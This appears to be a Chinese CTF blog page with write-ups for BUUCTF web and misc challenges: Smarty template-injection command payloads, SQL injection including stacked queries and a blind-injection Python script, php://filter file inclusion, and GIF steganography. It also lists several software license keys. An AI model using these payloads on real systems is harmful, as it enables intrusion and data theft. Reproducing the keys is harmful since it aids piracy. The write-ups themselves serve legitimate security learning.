<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if passthru(&#39;ls -al &#x2F; &#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/start.png"></p>
<p>查看文件，cat被过滤，可以用tac代替</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if passthru(&#39;tac &#x2F;start.sh&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/tac.png"></p>
<p>代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/tail -f /dev/null </span><br><span class="line">done </span><br><span class="line">sleep <span class="number">1000</span> </span><br><span class="line">do </span><br><span class="line"><span class="keyword">while</span> test <span class="string">&quot;1&quot;</span> = <span class="string">&quot;1&quot;</span> </span><br><span class="line">export T=$RANDOM </span><br><span class="line">FLAG=not_flag </span><br><span class="line">export FLAG=not_flag </span><br><span class="line">chmod <span class="number">444</span> /_$T </span><br><span class="line">echo $FLAG &gt; /_$T </span><br><span class="line">T=$RANDOM export </span><br><span class="line">T=$RANDOM </span><br><span class="line">service apache2 start </span><br><span class="line"><span class="comment">#!/usr/bin/env bash </span></span><br></pre></td></tr></table></figure>

<p>../就是上级目录，ls查看当前目录下的内容，ls ../就是查看上级目录下的内容<br> $Flag放入根目录下的_T文件下<br>T=$RANDOM<br>T随机生成数字</p>
<p>再看根目录发现_5846</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/_5846.png"></p>
<p>查看文件得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if passthru(&#39;tac &#x2F;_5846&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/flag1.png"></p>
<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>题目提示：</p>
<p>maybe the flag file’s filename is random</p>
<p>可尝试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;passthru(&#39;more &#x2F;*&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>除了用more，还可以用less，head，tail，nl，vim等</p>
<h2 id="buu-CISCN2019-华东南赛区-Web11"><a href="#buu-CISCN2019-华东南赛区-Web11" class="headerlink" title="buu-[CISCN2019 华东南赛区]Web11"></a>buu-[CISCN2019 华东南赛区]Web11</h2><p>题目：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E7%81%AB%E7%8B%90%E6%88%AA%E5%9B%BE_2021-06-16T12-04-05.384Z.png"></p>
<p>提示smarty注入</p>
<p>burp suite抓包，在headers添加：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:&#123;7*7&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/111.png"></p>
<p>测试结果为49，确定存在SSTI。</p>
<p>将XFF改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;system(&#39;cat &#x2F;flag&#39;)&#125;</span><br></pre></td></tr></table></figure>

<p>或：</p>
<p>使用 {if}标签，构造payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if readfile(&#39;&#x2F;flag&#39;)&#125;&#123;&#x2F;if&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/05/13/%E6%9D%82%E9%A1%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/13/%E6%9D%82%E9%A1%B9/" class="post-title-link" itemprop="url">杂项</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-05-13 00:00:00" itemprop="dateCreated datePublished" datetime="2021-05-13T00:00:00+08:00">2021-05-13</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-08-20 02:21:09" itemprop="dateModified" datetime="2021-08-20T02:21:09+08:00">2021-08-20</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><p>文件是一个gif动图，还能看到有红色的flag快速闪过</p>
<h3 id="stegsolve"><a href="#stegsolve" class="headerlink" title="stegsolve"></a>stegsolve</h3><p> <strong>法一</strong>：用图片隐写查看器stegsolve打开，用Frame Browser查看动态图的每一帧。<br> 发现其第21、51和79帧有猫腻，将它们结合起来就是flag了。</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E8%83%96.png"></p>
<hr>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E8%83%962.png"></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E8%83%963.png"></p>
<p>注意he11o中，是数字1，不是字母l</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;he11ohongke&#125;</span><br></pre></td></tr></table></figure>

<p>stegsolve主要功能是Analyse，下面对一些功能进行介绍：<br>File Format：图片格式，主要查看图片具体信息；<br>Data Extract：数据抽取，图片中隐藏数据的抽取；<br>Frame Browser：帧浏览器，主要是对GIF之类的动图进行分解，动图变成一张张图片，便于查看；<br>Image Combiner：拼图，图片拼接。</p>
<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>许可证</p>
<p>【帮助】-&gt;【输入许可证密钥】</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">YG5H2-ANZ0H-M8ERY-TXZZZ-YKRV8</span><br><span class="line">UG5J2-0ME12-M89WY-NPWXX-WQH88</span><br><span class="line">UA5DR-2ZD4H-089FY-6YQ5T-YPRX6</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/05/12/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/12/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-05-12 00:00:00" itemprop="dateCreated datePublished" datetime="2021-05-12T00:00:00+08:00">2021-05-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-19 19:08:14" itemprop="dateModified" datetime="2021-07-19T19:08:14+08:00">2021-07-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019] EasySQL"></a>[极客大挑战 2019] EasySQL</h2><h3 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h3><p>题目：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E9%A2%98%E7%9B%AE.png"></p>
<p>页面为登陆模式，需要输入用户名和密码</p>
<p>尝试输入1，结果提示用户名和密码错误；</p>
<p>在<code>username</code>处加个常规的<code>&#39;</code>，结果报错了：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8A%A5%E9%94%99.png"></p>
<p>考虑到是SQL注入，于是在用户名和密码均输入万能密码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p>成功登录，得到flag</p>
<h2 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h2><h3 id="判断注入方法"><a href="#判断注入方法" class="headerlink" title="判断注入方法"></a>判断注入方法</h3><p>显注：union 联合查询，union被过滤</p>
<p>报错注入：and、or、updatexml被过滤。没有报错信息，报错注入基本不用考虑</p>
<p>bool注入：and、or被过滤。不管怎么样都是返回nonono，就连数据库长度大于1这种探针都返回nonono，说明应该不是bool注入</p>
<p>time注入：and、or被过滤。</p>
<p><strong>堆叠注入</strong>：考虑到过滤了很多关键词，尝试堆叠查询，这个可使用的语句比较多。就是一个sql语句”;”后面可以继续执行sql查询语句</p>
<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p><strong>post 传参</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1;show databases;   #查询数据库</span><br><span class="line">1;show tables;      #查询表名</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/tables.png"></p>
<p>构造<strong>payload</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>

<p>拼接一下，就是：<code>select *,1||flag from Flag</code></p>
<p>等同于<code>select *,1 from Flag</code></p>
<p><strong>查询语句</strong>：<code>select *,1||flag from Flag</code></p>
<ul>
<li><p>sql=select.post[‘query’].”||flag from Flag”;<br>如果$post[‘query’]的数据为*,1，sql语句就变成了<code>select *,1||flag from Flag</code>，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。</p>
</li>
<li><p><code>||</code>在mysql中表示或，如果前一个操作数为真，则不看后面的语句</p>
<p><code>||</code>相当于将 select 1 和 select flag from flag 的结果拼接在一起</p>
</li>
<li><p>select任何一个常数都会在表中新建一列，即增加一个临时列，列名是1。然后查询出那一列的内容。<code>select 1 from Flag</code>的结果就是那一列的值都为1，这一列有几个字段取决于原字段的多少。</p>
</li>
</ul>
<p>整个payload语句的意思就是查询所有数据，然后增加一个临时列</p>
<p>第一列是本来数据库的，后面是新增的临时列</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1.flag.png"></p>
<h2 id="强网杯-2019-随便注-1"><a href="#强网杯-2019-随便注-1" class="headerlink" title="[强网杯 2019]随便注 1"></a>[强网杯 2019]随便注 1</h2><h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>题目标题直接就是easy_sql，即sql注入。</p>
<p>输入<code>1&#39;</code>，发现报错</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1'.png"></p>
<p>于是利用<code>#</code>进行截断（注释掉）：<code>1&#39; #</code></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1'"></p>
<p>回显正常</p>
<p>尝试<code>1&#39; or 1=1 #</code></p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> or 1=1 )</p>
<h4 id="判断字段数量"><a href="#判断字段数量" class="headerlink" title="判断字段数量"></a>判断字段数量</h4><p>输入<code>1&#39; order by 1#</code>，正常回显</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> order by 1)</p>
<p>输入<code>1&#39; order by 2#</code>，也是正常回显</p>
<p>而输入<code>1&#39; order by 3#</code>，报错了，说明字段数为2</p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> order by 3)</p>
<h4 id="判断显注点"><a href="#判断显注点" class="headerlink" title="判断显注点"></a>判断显注点</h4><ul>
<li><p>union 联合查询判断显注点：<code>1&#39; union select 1,2 #</code></p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> union select 1,2 )</p>
<p><code>preg_match</code>正则匹配，过滤掉<code>select|update|delete|drop|insert|where|</code></p>
</li>
</ul>
<p>很多常用的字段都被过滤了</p>
<p>想到堆叠注入</p>
<h4 id="堆叠注入-2"><a href="#堆叠注入-2" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p><code>1&#39; ; show databases;#</code></p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show databases;)</p>
<p>成功回显，于是查询表名</p>
<p><code>1&#39; ; show tables;#</code></p>
<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show tables;)</p>
<p>查询两个表中的列名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ; show columns from words;#</span><br></pre></td></tr></table></figure>

<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show columns from words;)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ; show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>

<p>![](<a target="_blank" rel="noopener" href="https://gitee.com/chen-lishan/tuc/raw/master/1&#39;">https://gitee.com/chen-lishan/tuc/raw/master/1&#39;</a> ; show columns from <code>1919810931114514</code>;)</p>
<h3 id="修改表名和列名"><a href="#修改表名和列名" class="headerlink" title="修改表名和列名"></a>修改表名和列名</h3><p>words表（含id 和data列）会回显具体内容；而1919810931114514表（含flag列）中的内容无法显示出来，即flag列在1919810931114514表中无法显示。</p>
<p>因此需要：</p>
<ul>
<li>将表名words换为其他的，如word1</li>
<li>将表名1919810931114514换为words</li>
<li>将列名flag换为id</li>
</ul>
<p>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; ; rename tables &#96;words&#96; to &#96;word1&#96; ; rename tables &#96;1919810931114514&#96; to &#96;words&#96; ;  alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);# </span><br></pre></td></tr></table></figure>

<p>这样就改变了数据库结构，输入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1’ or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h4 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h4><p>题目提示是sql注入</p>
<p>简单测试一下，输入不同的字符会有不同的回显，输入<code>1&#39;</code>，返回bool（false），那么，应该是<strong>bool注入</strong></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/bool.png"></p>
<p>测试发现，ascii、substr都没有被过滤；空格被过滤了，可以使用()代替</p>
<h4 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a><strong>POST传参</strong></h4><p><strong>POST传参</strong>，payload写在下方，<code>id=</code></p>
<p>而GET传参，payload应连在网址后面</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/post.png"></p>
<h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><p>题目提示：All You Want Is In Table ‘flag’ and the column is ‘flag’</p>
<p>flag在flag表的flag字段中，于是可以写<code>select(flag)from(flag)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(ascii(substr((select(flag)from(flag)),1,1))&#x3D;ascii(&#39;f&#39;))</span><br></pre></td></tr></table></figure>

<p><code>^</code>是异或，意思是or</p>
<h4 id="二分脚本"><a href="#二分脚本" class="headerlink" title="二分脚本"></a>二分脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&#x27;http://b983611d-30c5-4eef-bd3d-4178a5d4656b.node3.buuoj.cn&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    low=<span class="number">32</span></span><br><span class="line">    mid=(high+low)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> high&gt;low:</span><br><span class="line">        payload=<span class="string">&quot;0^&quot;</span> + <span class="string">&quot;(ascii(substr((select(flag)from(ftlag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.format(x,mid)</span><br><span class="line">        data=&#123;<span class="string">&quot;id&quot;</span>:payload&#125;</span><br><span class="line">        html=requests.post(url,data=data).text</span><br><span class="line">        <span class="comment">#time.sleep(0.5)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> html:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">    result+=chr(int(mid))</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>

<p><strong>format 函数</strong>：</p>
<p>通过 <code>&#123;&#125;</code>和 <code>: </code>来代替以前的 <code>%</code> 。format 函数可以接受不限个参数，位置可以不按顺序。</p>
<p>得到flag：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/3.flag.png" alt="img"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2021/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">文件包含漏洞</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-04-22 00:00:00" itemprop="dateCreated datePublished" datetime="2021-04-22T00:00:00+08:00">2021-04-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2021-07-19 19:11:57" itemprop="dateModified" datetime="2021-07-19T19:11:57+08:00">2021-07-19</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="buu-ACTF2020-新生赛-Include-1"><a href="#buu-ACTF2020-新生赛-Include-1" class="headerlink" title="buu-[ACTF2020 新生赛]Include 1"></a>buu-[ACTF2020 新生赛]Include 1</h2><p>进入题目，url中有 ?file=flag.php ，而且题目名字有include，猜测文件包含漏洞</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%EF%BC%9Ffile=php%E3%80%82flag.png"></p>
<p>尝试文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>

<p>构造playload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>

<p>得到一长串字符</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/base64.png"></p>
<p>base64解码，得到flag</p>
<h2 id="buu-WarmUp（任意文件包含漏洞）"><a href="#buu-WarmUp（任意文件包含漏洞）" class="headerlink" title="buu-WarmUp（任意文件包含漏洞）"></a>buu-WarmUp（任意文件包含漏洞）</h2><p>查看题目源码：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/warm1.png"></p>
<p>可以发现提示有source.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;be326190-e159-4cb1-8994-cf72b7960fe7.node3.buuoj.cn&#x2F;source.php</span><br></pre></td></tr></table></figure>

<p>查看文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">##不能为空</span></span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">##是字符串</span></span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])  <span class="comment">##上面checkfile返回为true</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看hint.php，提示：flag not here, and flag in ffffllllaaaagggg</p>
<p>白名单只有source.php和hint.php，通过访问hint.php我们可以知道flag在ffffllllaaaagggg文件中</p>
<p>百度可知这是一个phpmyadmin 4.8.1 远程文件包含漏洞</p>
<p>代码审计：<br>checkfile()函数</p>
<ul>
